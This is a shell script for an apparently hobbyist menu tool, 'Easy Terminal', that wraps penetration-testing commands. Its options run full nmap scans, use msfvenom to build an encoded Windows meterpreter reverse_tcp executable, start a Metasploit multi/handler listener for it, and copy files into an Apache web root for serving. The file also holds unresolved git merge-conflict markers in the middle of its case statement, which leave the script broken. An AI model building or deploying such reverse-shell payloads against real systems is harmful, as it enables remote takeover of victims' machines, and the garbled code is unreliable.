#!/bin/sh

print_menu() {
    echo $Blue2"========================================================================="
    figlet "Easy Terminal" | lolcat
    echo " [---] Welcome To Easy Terminal This Tool By Author : [---]"
    figlet "BO7MED MIX YT" | lolcat
    echo $Blue2"========================================================================="
    echo 
    echo $red "==============================" $red "=============================="
    echo $red "[1]. Start Nmap Scan          " $red "[2]. Make Payload             "
    echo $red "==============================" $red "=============================="
    echo $cyan "==============================" $cyan "=============================="
    echo $cyan "[3]. Creat Metasploit Listener" $cyan "[4]. Start Nessus             "
    echo $cyan "==============================" $cyan "=============================="
    echo $okegreen  "==============================" $okegreen "=============================="
    echo $okegreen  "[5]. Start Apache2            " $okegreen "[6]. Stop Apache2             "
    echo $okegreen  "==============================" $okegreen "=============================="
    echo $yellow "=============================="  $yellow "=============================="
    echo $yellow "[7]. Update & Upgrade System  "  $yellow "[8]. Remove Old Updates Files"
    echo $yellow "=============================="  $yellow "=============================="
                                     
    echo $white                 "=============================="
    echo $white                 "[9]. Exit                     "
    echo $white                 "=============================="
    


}


cyan='\e[0;36m'
Blue2='\e[0;34m'
okegreen='\033[92m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
Blue='\e[1;34m'


show_ip_addresses() {
    echo "========================================================================="
    echo "IPv4 and IPv6 Addresses"
    echo "========================================================================="
    echo "IPv4 Addresses:"
    ip -4 addr show | grep inet | awk '{print $2}'
    echo ""
    echo "IPv6 Addresses:"
    ip -6 addr show | grep inet6 | awk '{print $2}'
    echo "========================================================================="
}



execute_option() {
    case $1 in
        1)
<<<<<<< HEAD
            read -p "Enter The Target Ip Or Link : " IP
            sudo nmap -sS -O -Pn -sV -p- $IP
            echo
            echo $okegreen"Press [ENTER] key to return to menu ."
            read cont
            clear 
            ;;
        
        
        
        2)  
            echo
            echo
            read -p "Enter LHOST (IP): " lhost
            echo
            read -p "Enter LPORT (Port): " lport
            echo
            read -p "Enter Payload Path (Such As "/home/kali") : " L
            echo
            read -p "Enter Payload Name (Such As "Payload.exe") : " N
            echo
            echo "Creating Payload..."
            payload_path="$L"
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 5 -o $payload_path/$N
            clear
            print_menu
            echo
            echo
            echo "Payload created successfully!"
            echo
            echo "Path to payload: $payload_path/$N"
            echo
            echo $okegreen"Press [ENTER] key to return to menu ."
            read cont
            clear
            ;;       
        
        
        
        3)  
            sudo postgresql service start
            sudo msfdb init
            xterm -fa monaco -fs 13 -bg black -e "
               
                echo
=======
            xterm -hold -e "
               
                echo '========================================================================='
                echo 'IPv4 and IPv6 Addresses'
                echo '========================================================================='
                echo 'IPv4 Addresses:'
                ip -4 addr show | grep inet | awk '{print \$2}'
                echo ''
                echo 'IPv6 Addresses:'
                ip -6 addr show | grep inet6 | awk '{print \$2}'
                echo '========================================================================='

               
>>>>>>> origin/main
                echo 'Enter LHOST (IP address for Metasploit):'
                read LHOST
                echo 'Enter LPORT (Port for Metasploit):'
                read LPORT
                echo 'Starting Metasploit With Listener...'

<<<<<<< HEAD
               
                msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST \$LHOST; set LPORT \$LPORT; exploit\"
=======
                
                msfconsole -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST \$LHOST; set LPORT \$LPORT; exploit\"
>>>>>>> origin/main
            " &
            ;;
        4)
            echo "Starting Nessus"
            sudo systemctl start nessusd
            clear
            echo "Nessus Started Successfully You Can Now"
            echo
            echo "Open Nessus By Open This Link { https://localhost:8834 }"
            echo
            echo $okegreen"Press [ENTER] key to return to menu ."
            read cont
            clear
            ;;

        5)
            echo "Starting Apache2 Service..."
            sudo service apache2 start
            echo
            read -p "Enter Location: " Source
            echo
            read -p "Enter Name: " Name
            sudo cp $Source /var/www/html/$Name
            echo "Appatche Sevice Started And Upload The Files Successfuly"
            echo
            echo $okegreen"Press [ENTER] key to return to menu ."
            read cont
            clear
            ;;
        6)
            echo "Stopping Apache2 Service..."
            echo "Stopped Successfully"
            sudo service apache2 stop
            echo
            echo $okegreen"Press [ENTER] key to return to menu ."
            read cont
            clear
            ;;

        7)
            echo "Updating and upgrading system..."
            sudo apt update
            sudo apt upgrade
            echo
            echo $okegreen"Press [ENTER] key to return to menu ."
            read cont
            clear
            ;;
            
        8)
            sudo apt autoremove
            echo "Removed Successfully"
            echo
            echo $okegreen"Press [ENTER] key to return to menu ."
            read cont
            clear
            ;;
            
        9)
            echo "Exiting..."
            exit 0
            ;;
            
        *)
            echo "Invalid choice. Try Again."
            sleep 2
            ;;
    esac
}

while true; do
    clear
    print_menu
    echo
    echo $okegreen"┌─["$red"EasyTreminal$okegreen]──[$red~$okegreen]─["$yellow"Menu$okegreen]:"
    read -p "└─────► " choice
    execute_option $choice
done
